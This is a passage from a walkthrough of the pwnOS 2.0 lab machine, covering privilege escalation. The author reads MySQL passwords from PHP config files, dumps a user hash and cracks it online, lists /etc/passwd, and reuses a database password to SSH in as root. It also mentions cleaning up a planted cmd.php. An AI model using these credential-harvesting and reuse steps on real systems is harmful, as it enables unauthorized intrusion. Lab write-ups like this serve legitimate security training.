root.</div><div><br/></div><div>We don't have any sudo commands available. We don't have any writable executables in our path. We don't have any good SUID executables in our path.</div><div><br/></div><div>Dropping back to /var/www, we are able to get database credentials for the "internal website" config file.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/var/www$ cat mysqli_connect.php</div><div>&lt;?php # Script 8.2 - mysqli_connect.php</div><div><br/></div><div>// This file contains the database access information.</div><div>// This file also establishes a connection to MySQL</div><div>// and selects the database.</div><div><br/></div><div>// Set the database access information as constants:</div><div><br/></div><div>DEFINE ('DB_USER', 'root');</div><div>DEFINE ('DB_PASSWORD', 'goodday');</div><div>DEFINE ('DB_HOST', 'localhost');</div><div>DEFINE ('DB_NAME', 'ch16');</div><div><br/></div><div>// Make the connection:</div><div><br/></div><div>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );</div><div><br/></div><div>?&gt;</div></div><div><br/></div><div>Dropping back another directory, we see another mysqli_connect.php file with different credentials.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/var$ cat mysqli_connect.php</div><div>&lt;?php # Script 8.2 - mysqli_connect.php</div><div><br/></div><div>// This file contains the database access information.</div><div>// This file also establishes a connection to MySQL</div><div>// and selects the database.</div><div><br/></div><div>// Set the database access information as constants:</div><div><br/></div><div>DEFINE ('DB_USER', 'root');</div><div>DEFINE ('DB_PASSWORD', 'root@ISIntS');</div><div>DEFINE ('DB_HOST', 'localhost');</div><div>DEFINE ('DB_NAME', 'ch16');</div><div><br/></div><div>// Make the connection:</div><div><br/></div><div>$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );</div><div><br/></div><div>?&gt;</div></div><div><br/></div><div>Turns out the second file has the correct MySQL credentials for root (root@ISIntS).</div><div><br/></div><div>Connecting to the database, we only see one non-system database with one table containing one user (dan).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/$ mysql -u root -p</div><div>mysql -u root -p</div><div>Enter password: root@ISIntS</div><div><br/></div><div>Welcome to the MySQL monitor.  Commands end with ; or \g.</div><div>Your MySQL connection id is 39</div><div>Server version: 5.1.54-1ubuntu4 (Ubuntu)</div><div><br/></div><div>Copyright (c) 2000, 2010, Oracle and/or its affiliates. All rights reserved.</div><div>This software comes with ABSOLUTELY NO WARRANTY. This is free software,</div><div>and you are welcome to modify and redistribute it under the GPL v2 license</div><div><br/></div><div>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</div><div><br/></div><div>mysql&gt; show databases;</div><div>+--------------------+</div><div>| Database           |</div><div>+--------------------+</div><div>| information_schema |</div><div>| ch16               |</div><div>| mysql              |</div><div>+--------------------+</div><div>3 rows in set (0.00 sec)</div><div><br/></div><div>mysql&gt; use ch16;</div><div>Reading table information for completion of table and column names</div><div>You can turn off this feature to get a quicker startup with -A</div><div><br/></div><div>Database changed</div><div>mysql&gt; show tables;</div><div>+----------------+</div><div>| Tables_in_ch16 |</div><div>+----------------+</div><div>| users          |</div><div>+----------------+</div><div>1 row in set (0.00 sec)</div><div><br/></div><div>mysql&gt; select * from users;</div><div>+---------+------------+-----------+------------------+------------------------------------------+------------+--------+---------------------+</div><div>| user_id | first_name | last_name | email            | pass                                     | user_level | active | registration_date   |</div><div>+---------+------------+-----------+------------------+------------------------------------------+------------+--------+---------------------+</div><div>|       1 | Dan        | Privett   | <a href="mailto:admin@isints.com">admin@isints.com</a> | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af |          0 | NULL   | 2011-05-07 17:27:01 |</div><div>+---------+------------+-----------+------------------+------------------------------------------+------------+--------+---------------------+</div><div>1 row in set (0.03 sec)</div></div><div><br/></div><div>Submitting the hash for dan to <a href="https://hashkiller.co.uk/Cracker/MD5" target="_blank">https://hashkiller.co.uk/Cracker/MD5</a>, we come back with the following.</div><div><br/></div><div><img height="64" src="/assets/images/2019-04-15-pwnos-2.0-pre-release/6ACF890E-3D6C-46C0-A0A4-1E16E293DCF2.png" width="576"/><br/></div><div><br/></div><div>We see that dan is a user in /etc/passwd...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@web:/$ cat /etc/passwd </div><div>cat /etc/passwd</div><div>root:x:0:0:root:/root:/bin/bash</div><div>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div><div>bin:x:2:2:bin:/bin:/bin/sh</div><div>sys:x:3:3:sys:/dev:/bin/sh</div><div>sync:x:4:65534:sync:/bin:/bin/sync</div><div>games:x:5:60:games:/usr/games:/bin/sh</div><div>man:x:6:12:man:/var/cache/man:/bin/sh</div><div>lp:x:7:7:lp:/var/spool/lpd:/bin/sh</div><div>mail:x:8:8:mail:/var/mail:/bin/sh</div><div>news:x:9:9:news:/var/spool/news:/bin/sh</div><div>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</div><div>proxy:x:13:13:proxy:/bin:/bin/sh</div><div>www-data:x:33:33:www-data:/var/www:/bin/sh</div><div>backup:x:34:34:backup:/var/backups:/bin/sh</div><div>list:x:38:38:Mailing List Manager:/var/list:/bin/sh</div><div>irc:x:39:39:ircd:/var/run/ircd:/bin/sh</div><div>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</div><div>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</div><div>libuuid:x:100:101::/var/lib/libuuid:/bin/sh</div><div>syslog:x:101:103::/home/syslog:/bin/false</div><div>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash</div><div>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</div><div>landscape:x:104:110::/var/lib/landscape:/bin/false</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash</font></div></div><div><br/></div><div>...so I decide to try to SSH to the server using the same credentials.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# ssh dan@10.10.10.100</div><div>dan@10.10.10.100's password:</div><div>Permission denied, please try again.</div><div>dan@10.10.10.100's password:</div><div>Permission denied, please try again.</div></div><div><br/></div><div>I also tried the MySQL root credentials (root@ISIntS), but they didn't work either. Next, I tried to use the same two credentials to connect as root...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pwnosv2# ssh root@10.10.10.100</div><div>root@10.10.10.100's password: </div><div>Permission denied, please try again.</div><div>root@10.10.10.100's password: </div><div>Welcome to Ubuntu 11.04 (GNU/Linux 2.6.38-8-server x86_64)</div><div><div><br/></div></div><div> * Documentation:  http://www.ubuntu.com/server/doc</div><div><div><br/></div></div><div>  System information as of Fri Mar  1 02:07:22 EST 2019</div><div><div><br/></div></div><div>  System load:  0.0               Processes:           85</div><div>  Usage of /:   2.9% of 38.64GB   Users logged in:     1</div><div>  Memory usage: 21%               IP address for eth0: 10.10.10.100</div><div>  Swap usage:   0%</div><div><div><br/></div></div><div>  Graph this data and manage this system at https://landscape.canonical.com/</div><div>Last login: Fri Mar  1 02:01:31 2019 from 10.10.10.101</div><div>root@web:~# id</div><div>uid=0(root) gid=0(root) groups=0(root)</div></div><div><br/></div><div>Nice! The 'killerbeesareflying' password didn't work, but the 'root@ISIntS' did. 😄</div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** STOP /var/www/blog/images/thumbs ***</div><div>*** REMOVE thumbs, cmd.php and reset.php from /var/www/blog/images/ ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">Removing secondary IP from Mac</span></div><div><br/></div><div>I was able to remove the secondary IP address from my Mac using the following command.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>sudo ifconfig en0 alias 10.10.10.102/24 delete</div></div><div><br/></div><div><br/></div></body></html>